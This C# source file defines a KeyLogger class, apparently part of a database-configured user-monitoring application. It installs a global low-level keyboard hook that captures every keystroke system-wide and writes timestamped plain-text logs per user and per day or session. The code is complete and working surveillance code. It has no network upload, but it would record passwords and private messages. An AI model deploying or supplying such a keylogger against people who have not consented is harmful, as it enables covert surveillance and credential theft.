using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Apac.Database;
using Apac.Models;

namespace Apac.Services
{
    public class KeyLogger : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private IntPtr _hookId = IntPtr.Zero;
        private LowLevelKeyboardProc _proc;
        private CancellationTokenSource _cts;
        private Task _writeTask;
        private readonly StringBuilder _buffer = new StringBuilder();
        private readonly object _bufferLock = new object();
        private readonly int _userId;
        private readonly string _username;
        private string _currentLogFile;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public KeyLogger(int userId, string username)
        {
            _userId = userId;
            _username = username;
            _proc = HookCallback;
        }

        public void Start()
        {
            var config = DatabaseService.Instance.GetMonitoringConfig();
            if (!config.KeyloggerEnabled) return;

            string folder = config.KeyloggerFolder ?? Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "KeyLogs");
            Directory.CreateDirectory(folder);

            string dateStr = DateTime.Now.ToString("yyyyMMdd");
            string mode = config.KeyloggerMode ?? "per_day";
            _currentLogFile = mode == "per_session"
                ? Path.Combine(folder, $"keylog_{dateStr}_session_{DateTime.Now:HHmmss}_{_username}.txt")
                : Path.Combine(folder, $"keylog_{dateStr}_{_username}.txt");

            _cts = new CancellationTokenSource();
            _writeTask = Task.Run(() => FlushLoop(_cts.Token));

            _hookId = SetHook(_proc);
        }

        public void Stop()
        {
            if (_hookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookId);
                _hookId = IntPtr.Zero;
            }

            _cts?.Cancel();
            try { _writeTask?.Wait(3000); } catch { }

            FlushBuffer();
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyText = KeyCodeToText(vkCode);

                if (!string.IsNullOrEmpty(keyText))
                {
                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    string line = $"[{timestamp}] {_username}: {keyText}";

                    lock (_bufferLock)
                    {
                        _buffer.AppendLine(line);
                    }
                }
            }

            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private string KeyCodeToText(int vkCode)
        {
            switch (vkCode)
            {
                case 0x0D: return "[ENTER]";
                case 0x08: return "[BACKSPACE]";
                case 0x09: return "[TAB]";
                case 0x1B: return "[ESC]";
                case 0x20: return "[SPACE]";
                case 0x2E: return "[DEL]";
                case 0x21: return "[PAGEUP]";
                case 0x22: return "[PAGEDOWN]";
                case 0x23: return "[END]";
                case 0x24: return "[HOME]";
                case 0x25: return "[LEFT]";
                case 0x26: return "[UP]";
                case 0x27: return "[RIGHT]";
                case 0x28: return "[DOWN]";
                case 0x70: return "[F1]";
                case 0x71: return "[F2]";
                case 0x72: return "[F3]";
                case 0x73: return "[F4]";
                case 0x74: return "[F5]";
                case 0x75: return "[F6]";
                case 0x76: return "[F7]";
                case 0x77: return "[F8]";
                case 0x78: return "[F9]";
                case 0x79: return "[F10]";
                case 0x7A: return "[F11]";
                case 0x7B: return "[F12]";
                case 0xA0: return "[LSHIFT]";
                case 0xA1: return "[RSHIFT]";
                case 0xA2: return "[LCTRL]";
                case 0xA3: return "[RCTRL]";
                case 0xA4: return "[LALT]";
                case 0xA5: return "[RALT]";
                case 0x5B: return "[LWIN]";
                case 0x5C: return "[RWIN]";
                case 0x2C: return "[PRTSC]";
                default:
                    try
                    {
                        var key = (System.Windows.Forms.Keys)vkCode;
                        return key.ToString().Length == 1 ? key.ToString().ToLower() : $"[{key}]";
                    }
                    catch { return $"[{vkCode}]"; }
            }
        }

        private async Task FlushLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                await Task.Delay(2000, token);
                FlushBuffer();
            }
        }

        private void FlushBuffer()
        {
            lock (_bufferLock)
            {
                if (_buffer.Length > 0 && _currentLogFile != null)
                {
                    try
                    {
                        File.AppendAllText(_currentLogFile, _buffer.ToString());
                        _buffer.Clear();
                    }
                    catch { }
                }
            }
        }

        public void Dispose()
        {
            Stop();
            _cts?.Dispose();
        }
    }
}
